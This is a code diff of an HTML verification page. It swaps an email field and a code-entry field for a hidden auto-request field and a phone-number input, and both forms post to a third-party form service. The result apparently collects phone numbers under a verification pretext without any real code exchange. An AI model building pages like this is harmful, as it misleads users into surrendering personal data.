@@ -61,13 +61,12 @@
 
     <div id="requestSection">
       <h2>Verification</h2>
-      <p style="font-size: 12px; color: #aaa;">Enter your email to request your access code.</p>
+      <p style="font-size: 12px; color: #aaa;">Click below to request your code.</p>
       
       <!-- Form 1: Request Code -->
       <form id="requestCodeForm" action="https://forminit.com/f/w0ljqwvp09y" method="POST">
-        <input type="hidden" name="request_type" value="New Character Code Request">
-        <!-- Required field so submission is not empty -->
-        <input type="email" name="user_email" placeholder="Enter your email" required>
+        <!-- Hidden field ensures submission is never empty -->
+        <input type="hidden" name="request_type" value="Auto Code Request">
         <button type="submit" id="reqBtn">Request Code</button>
       </form>
       
@@ -79,14 +78,14 @@
     <hr>
 
     <div id="submitSection">
-      <h3>Enter Received Code</h3>
+      <h3>Enter Your Number</h3>
       <!-- Form 2: Submit Code -->
       <form id="submitCodeForm" action="https://forminit.com/f/w0ljqwvp09y" method="POST">
-        <input type="text" name="entered_code" placeholder="Enter characters here" required>
+        <input type="text" name="phone_number" placeholder="Enter your number" required>
         <button type="submit" id="subBtn">Submit & Verify</button>
       </form>
       <div id="successMessage" class="status-msg" style="color: #4caf50;">
-        ✔ Code submitted! Checking...
+        ✔ Number submitted! Checking...
       </div>
     </div>
   </div>
